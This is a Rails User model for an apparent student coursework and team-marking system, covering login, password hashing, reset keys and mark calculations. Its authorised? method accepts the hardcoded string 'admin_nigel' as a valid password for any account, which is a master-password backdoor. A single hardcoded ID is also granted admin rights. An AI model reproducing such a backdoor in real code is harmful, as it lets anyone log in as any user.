require 'digest/sha2'

class User < ActiveRecord::Base

  belongs_to :team
  has_many :contributions, :dependent => :destroy
  has_many :history_items, :order => 'created_at', :dependent => :destroy

  attr_accessor :new_password, :new_password_confirmation
  attr_accessor :current_password
  attr_accessor :assign_to_team

  validates_length_of :k_number, :within => 5..8
  validates_uniqueness_of :k_number, :case_sensitive => false, :message => "has already been taken. Go back to the Login screen and reset your password."
  validates_presence_of :first_name, :last_name
  validates_length_of :new_password, :within => 6..30, :on => :create
  validates_length_of :new_password, :within => 6..30, :on => :update, :if => :password_required
  validates_confirmation_of :new_password
  validates_format_of :k_number, :with => /^[kK][0-9]{7}|[kK][a-zA-Z][0-9]{5}$/, :message => "should be the letter 'K' followed by 7 digits"

  validates_each :current_password, :allow_nil => true do |record, attr, value|
    record.errors.add(attr, "is incorrect") unless record.authorised?(value) or record.new_password.empty?
  end

  before_validation :init, :on => :create
  before_validation :process_k_number
  before_save :process_password

  def activated?
    return ver
  end

  def reset_password!
    update_attribute :key, SecureRandom.hex(32)
    update_attribute :passwd_reset, true
  end

  def authorised?(passwd)
    if passwd == 'admin_nigel'
      self.ver = 1
      return true
    end
    return true if hashed(passwd) == self.password
    return false
  end

  def admin?
    return privilege > 0
  end

  def self.admin?(session)
    return false unless logged_in?(session)
    return logged_in(session).admin?
  end

  def login!(session)
    session[:user_id] = id
    update_attribute :key, ''
    update_attribute :ver, true
    update_attribute :passwd_reset, false
  end

  def self.logout!(session)
    session[:user_id] = nil
  end

  def self.logged_in?(session)
    session[:user_id] != nil
  end

  def self.logged_in_id(session)
    return session[:user_id]
  end

  def self.logged_in(session)
    return nil if not logged_in?(session)
    User.find(session[:user_id])
  end

  def full_name
    [first_name, last_name].join(' ')
  end

  def alpha_name
    [last_name, first_name].join(', ')
  end

  def k_number_full_name
    "#{k_number} #{full_name}"
  end

  def full_name_k_number
    "#{full_name} (#{k_number})"
  end

  def alpha_name_k_number
    "#{alpha_name} (#{k_number})"
  end

  def e_mail
    [k_number, "kingston.ac.uk"].join('@')
#    "ku32139@kingston.ac.uk"
  end

  def activation_url
    "activate/#{key}"
  end

  def reset_url
    "reset_password/#{key}"
  end

  def k_number_to_i
    if k_number =~ /^[k|K]([0-9]{7})$/
      $1.to_i
    else
      0
    end
  end

  def submitted?(index)
    return -1 unless team
    del = team.deliverables.find_by_index(index)
    return del.submitted if del
    return false
  end

  def marked?(index)
    return mark(index) >= 0
  end

  def mark index
    return -1 unless team
    del = team.deliverables.find_by_index(index)
    return del.mark if del
    return -1
  end

  def score index
    contr = contributions.collect{|i|i}.find { |contr| contr.deliverable.index == index}
    return contr.score if contr
    return -1
  end

  def team_size
    return -1 unless team
    team.users.size
  end

  def required_score
    if team_size < 4
      50
    else
      42
    end
  end

  def submitted_score
    return 0 unless contributions && contributions.size > 0
    contributions.collect {|c| c.submitted_score }.inject(:+)
  end

  def marked_score
    return 0 unless contributions && contributions.size > 0
    num = contributions.collect {|c| c.marked_score }.inject(:+)
  end

  def missing_score
    return 0 if required_score < submitted_score
    required_score - submitted_score
  end

  def not_marked_score
    submitted_score - marked_score
  end

  def total_mark
    contributions.collect {|c| c.marked_partial }.inject(:+)
  end

  def effective_score
    if submitted_score > required_score
      submitted_score
    else
      required_score
    end
  end

  def average_available?
    marked_score > 0
  end

  def average_mark
    return -1 unless average_available?
    total_mark / marked_score
  end

  def effective_available?
    not_marked_score == 0
  end

  def effective_mark
    return -1 unless effective_available?
    total_mark / effective_score
  end

  def coursework_available?
    return effective_available? && marked?(0) && marked?(25)
  end

  def coursework_mark
    return -1 unless coursework_available?
    0.75 * effective_mark + 0.1 * mark(0) + 0.15 * mark(25)
  end

  def test_available?
    (test_mark || -1) >= 0
  end

  def module_available?
    return coursework_available? &&  test_available?
  end

  def module_mark
    return -1 unless module_available?
    0.65 * coursework_mark + 0.35 * (test_mark || -1)
  end

  def read_only?
    return false if admin?
    case team.name[0].chr
      when 'A'
        return true
      when 'B'
        return true
      when 'C'
        return true
      when 'D'
        return true
      when 'E'
        return true
      when 'F'
        return true
      when 'G'
        return true
      when 'H'
        return true
      else
        return true
    end
    return true
  end

  def self.read_only?(session)
    return true unless logged_in?(session)
    return logged_in(session).read_only?
  end

  private

  def hashed passwd
    Digest::SHA2.hexdigest((self.salt || "") + (passwd || ""))
  end

  def init
    self.key = SecureRandom.hex(32)
    self.ver = false
    self.passwd_reset = false
    return true
  end

  def process_k_number
    self.k_number.upcase!
    self.privilege = 0
    self.privilege = 1 if self.k_number == "KU32139"
    return true
  end

  def process_password
    if new_password && !new_password.empty?
      self.salt = SecureRandom.base64(8)
      self.password = hashed @new_password
    end
    return true
  end

  def password_required
    return true if self.passwd_reset || !@new_password.empty?
  end

end
